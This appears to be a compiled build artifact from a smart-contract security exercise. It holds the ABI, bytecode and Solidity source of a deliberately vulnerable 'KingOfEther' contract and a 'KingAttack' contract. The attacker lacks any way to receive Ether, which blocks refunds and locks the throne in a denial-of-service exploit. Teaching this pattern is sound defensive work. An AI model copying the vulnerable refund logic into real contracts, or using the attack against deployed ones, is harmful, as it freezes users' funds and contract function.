{
  "contractName": "KingAttack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract KingOfEther",
          "name": "kingOfEther",
          "type": "address"
        }
      ],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060fa8061001f6000396000f3fe608060405260043610601c5760003560e01c8063d018db3e146021575b600080fd5b606060048036036020811015603557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506062565b005b8073ffffffffffffffffffffffffffffffffffffffff166369deb7b7346040518263ffffffff1660e01b81526004016000604051808303818588803b15801560a957600080fd5b505af115801560bc573d6000803e3d6000fd5b50505050505056fea264697066735822122029249c6bfbbf7e14e40be8080f1a528597b78aaccf68c26b3ee9f31db5a7482264736f6c634300060a0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract KingOfEther {\n\n    address public king;\n    uint public balance;\n\n    function claimThrone() external payable {\n        require(msg.value > balance, \"Need to pay more to become the king\");\n\n        (bool sent, ) = king.call{value: balance}(\"\");\n        require(sent, \"Failed to send Ether\");\n\n        balance = msg.value;\n        king = msg.sender;\n    }\n}\n\ncontract KingAttack {\n    function attack(KingOfEther kingOfEther) public payable {\n        kingOfEther.claimThrone{value: msg.value}();\n    }\n}",
  "sourcePath": "/home/dev/Desktop/Sol/other/Smart_contract_programmer/Security/contracts/DenialOfService.sol",
  "compiler": {
    "name": "solc",
    "version": "0.6.10+commit.00c0fcaf.Emscripten.clang"
  },
  "schemaVersion": "3.4.3",
  "updatedAt": "2021-11-12T06:44:41.697Z",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}